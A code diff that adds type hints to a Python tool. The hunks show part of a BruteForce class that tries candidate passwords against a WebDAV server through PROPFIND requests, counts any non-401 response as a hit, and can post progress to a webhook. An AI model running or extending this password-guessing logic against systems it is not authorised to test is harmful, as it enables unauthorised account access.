@@ -23,7 +23,7 @@ import string
 import threading
 import time
 import urllib.parse
-from typing import Tuple
+from typing import Iterable, Tuple
 
 import cbor
 import requests
@@ -211,7 +211,7 @@ class WebHook:
         self.session = requests.session()
         self.tasks = queue.Queue()
 
-    def run(self):
+    def run(self) -> None:
         while True:
             data = self.tasks.get()
             while True:
@@ -226,7 +226,7 @@ class WebHook:
                 break
             self.tasks.task_done()
 
-    def send(self, data) -> None:
+    def send(self, data: dict) -> None:
         self.tasks.put(data)
 
 
@@ -235,11 +235,11 @@ class BruteForce:
         self.started = False
         self.exit = None
 
-    def log(self, data):
-        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data}")
+    def log(self, message) -> None:
+        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}")
         if args.webhook is not None:
             webhook.send({
-                "content": f"[`{time.strftime('%Y-%m-%d %H:%M:%S')}`] **{data}**"
+                "content": f"[`{time.strftime('%Y-%m-%d %H:%M:%S')}`] **{message}**"
             })
 
     def run(self) -> Tuple[requests.Response, str]:
@@ -316,7 +316,7 @@ class BruteForce:
                         break
                     time.sleep(0.1)
 
-    def check(self, password) -> None:
+    def check(self, password: str) -> None:
         # check for rights
         r = dav.request(
             "PROPFIND",
@@ -333,11 +333,11 @@ class BruteForce:
         if r.status_code != 401:
             self.exit = r, password
 
-    def check_passwords(self, passwords) -> None:
+    def check_passwords(self, passwords: Iterable[str]) -> None:
         for password in passwords:
             self.check(password)
 
-    def brute_force(self, start) -> None:
+    def brute_force(self, start: str) -> None:
         for i in range(2):
             for j in map("".join, itertools.product(args.b64_characters, repeat=i+1)):
                 self.check(f"{start}{j}")
